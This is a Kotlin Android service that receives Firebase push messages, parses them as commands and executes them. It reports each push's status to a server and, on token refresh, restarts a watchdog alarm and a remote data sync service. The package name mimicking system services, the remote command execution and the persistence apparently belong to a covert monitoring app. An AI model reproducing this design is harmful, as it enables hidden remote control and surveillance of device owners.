package com.android.services.services.firebase

import android.annotation.SuppressLint
import com.android.services.db.entities.*
import com.android.services.di.module.ApplicationScope
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.*
import com.android.services.network.api.TOSApi
import com.android.services.receiver.WatchDogAlarmReceiver
import com.android.services.util.*
import com.android.services.util.FirebasePushUtils.updatePushStatus
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import javax.inject.Inject


@AndroidEntryPoint
class FirebasePushService : FirebaseMessagingService() {

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope

    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource
    @Inject
    lateinit var tosApi: TOSApi
    private val watchDogReceiver = WatchDogAlarmReceiver()

    companion object {
        private const val TAG = "FirebasePushService"
    }

    /**
     *  Called When a new fcm push received
     *  [remoteMessage] contains the fcm push body
     */
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        logVerbose("$TAG fcm push received ")
        if (remoteMessage.data.isNotEmpty()) {
            try {
                val push: String = remoteMessage.data["body"] as String
                logVerbose("$TAG fcm push body = $push")
                handleFCMPush(push, ::parseFCMPush, ::executeFCMPush)
                AppUtils.appendLog(applicationContext, "push = $push")
            } catch (exception: Exception) {
                logException(
                    "$TAG fcm push exception = ${exception.message}",
                    throwable = exception
                )
            }
        } else {
            logVerbose("$TAG fcm push is Empty")
        }
    }

    /** Handles the fcm push, parse it, and executes the push*/
    private inline fun handleFCMPush(
        push: String,
        crossinline parsePush: (String) -> FCMPush,
        crossinline executePush: (FCMPush) -> Unit,
    ) {
        coroutineScope.launch(Dispatchers.Main) {
            try {
                val fcmPush: FCMPush =
                    withContext(Dispatchers.IO) { return@withContext parsePush(push) }
                withContext(Dispatchers.IO) { (executePush(fcmPush)) }
            } catch (exception: Exception) {
                logException(
                    "$TAG fcm push handle exception = ${exception.message}",
                    throwable = exception
                )
            }
        }
    }

    /** Parses the FCM push Object **/
    @Throws(Exception::class)
    private fun parseFCMPush(fcmPush: String): FCMPush = FirebasePushUtils.parsePush(fcmPush)

    /**
     * Executes the fcm Push [push], determines the push Method, and Process it
     * @param push Fcm Push
     */
    @SuppressLint("NewApi")
    @Throws(Exception::class)
    private fun executeFCMPush(push: FCMPush) {

        val (pushNotExistsAlready, fcmPush, fcmPushStatus) = FirebasePushUtils.executePushCommand(
            applicationContext,
            coroutineScope,
            localDatabaseSource,
            tosApi,
            fcmPush = push
        )

        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} push exits = ${!pushNotExistsAlready}")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} fcm push = $fcmPush")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} push push status = $fcmPushStatus")

        if (pushNotExistsAlready) {
            fcmPush?.let { fcm ->
                fcmPushStatus?.let { status ->
                    updatePushStatus(
                        applicationContext,
                        localDatabaseSource,
                        tosApi,
                        fcm.pushId,
                        status,
                        syncStatus = true
                    )
                } ?: run {
                    logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} fcm push status is null")
                }
            } ?: run {
                logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} fcm push is null")
            }
        }
    }

    override fun onNewToken(newToken: String) {
        super.onNewToken(newToken)
        logVerbose("fcm push new token received = $newToken ", TAG)
        AppConstants.fcmToken = newToken
        AppConstants.fcmTokenStatus = false
        watchDogReceiver.setAlarm(applicationContext)
        FirebasePushUtils.restartRemoteDataSyncService(applicationContext)
    }
}